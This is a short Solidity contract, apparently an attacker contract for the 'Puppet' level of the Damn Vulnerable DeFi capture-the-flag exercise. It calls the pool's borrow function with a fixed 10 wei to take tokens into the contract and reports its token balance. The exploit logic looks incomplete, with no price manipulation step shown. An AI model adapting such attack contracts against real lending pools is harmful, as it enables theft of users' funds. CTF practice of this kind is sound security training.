// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../puppet/PuppetPool.sol";
import "../DamnValuableToken.sol";

contract AttackPuppet {
    PuppetPool puppetPool;
    DamnValuableToken token;

    constructor(address _puppetPool, address _token) {
        puppetPool = PuppetPool(_puppetPool);
        token = DamnValuableToken(_token);
    }

    function attack(uint256 amount) public payable {
        puppetPool.borrow{value: 10}(amount, address(this));
    }

    function getBalance() public view returns (uint256) {
        return token.balanceOf(address(this));
    }

    receive() external payable {}
}
